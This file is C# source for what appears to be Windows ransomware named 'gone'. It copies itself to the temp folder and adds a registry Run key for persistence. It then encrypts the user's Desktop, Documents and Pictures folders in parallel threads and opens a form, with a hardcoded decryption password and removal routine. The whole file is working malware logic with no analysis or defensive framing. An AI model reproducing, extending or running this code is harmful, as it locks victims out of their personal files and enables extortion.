using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace gone;

internal class Program
{
	private static string desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

	private static string documents = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private static string pictures = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

	public static string DECRYPT_PASSWORD = "1234";

	private static void Main(string[] args)
	{
		if (Rooted())
		{
			Application.Run((Form)(object)new Form1());
			return;
		}
		Dupe_Program();
		StartUp();
		Rooted();
		Encrypt_All();
		Application.Run((Form)(object)new Form1());
	}

	private static void StartUp()
	{
		try
		{
			string text = Process.GetCurrentProcess().ProcessName + ".exe";
			string text2 = Path.GetTempPath() + text;
			Console.WriteLine(text2);
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("GN", "\"" + text2 + "\"");
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	private static bool Rooted()
	{
		if (Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", "GN", null) != null)
		{
			return true;
		}
		return false;
	}

	public static void Remove_Root()
	{
		if (Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", "GN", true) != null)
		{
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true))
			{
				registryKey.DeleteValue("GN", throwOnMissingValue: false);
			}
		}
	}

	public static void Encrypt_All()
	{
		Thread thread = new Thread((ThreadStart)delegate
		{
			Encrypt.EncryptContent(desktop);
		});
		Thread thread2 = new Thread((ThreadStart)delegate
		{
			Encrypt.EncryptContent(documents);
		});
		Thread thread3 = new Thread((ThreadStart)delegate
		{
			Encrypt.EncryptContent(pictures);
		});
		thread.Start();
		thread2.Start();
		thread3.Start();
		thread.Join();
		thread2.Join();
		thread3.Join();
	}

	public static void Decrypt_All()
	{
		Thread thread = new Thread((ThreadStart)delegate
		{
			Encrypt.DecryptContent(desktop);
		});
		Thread thread2 = new Thread((ThreadStart)delegate
		{
			Encrypt.DecryptContent(documents);
		});
		Thread thread3 = new Thread((ThreadStart)delegate
		{
			Encrypt.DecryptContent(pictures);
		});
		thread.Start();
		thread2.Start();
		thread3.Start();
		thread.Join();
		thread2.Join();
		thread3.Join();
	}

	private static void Dupe_Program()
	{
		try
		{
			string text = Process.GetCurrentProcess().ProcessName + ".exe";
			File.Copy(Path.Combine(Environment.CurrentDirectory, text), Path.GetTempPath() + text);
		}
		catch (Exception)
		{
		}
	}
}
